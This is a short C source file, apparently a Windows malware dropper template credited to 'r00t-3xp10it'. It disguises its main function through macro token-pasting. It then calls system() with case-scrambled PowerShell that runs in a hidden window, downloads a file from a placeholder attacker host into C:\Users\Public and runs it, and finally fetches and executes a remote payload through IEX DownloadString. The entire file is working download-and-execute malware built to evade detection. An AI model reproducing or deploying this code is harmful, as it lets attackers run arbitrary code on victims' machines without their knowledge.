/*
Author: pedro ubuntu [ r00t-3xp10it ]
Credits: null byte [ Method POC ]
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>

#define _____(i,s,o,g,r,a,m)(i##r##s##o)
#define _ _____(m,i,n,u,a,l,s)

int _()
{
  system("PoWeRsHeLl -wIn 1 -C (nEw-ObJeCt NeT.WebClIeNt).dOwNlOaDfIlE('http://LhOsT/ScRee', 'C:\\Users\\Public\\ScRee') & pOwErShElL -wIn 1 -c C:\\Users\\Public\\ScRee & pOwErShElL -wIn 1 -c \"IEX (NeW-oBjEcT nEt.WeBClIeNt).DoWnLoAdStRiNg('http://LhOsT/payload.EhLh')\"");
  return 0;
}

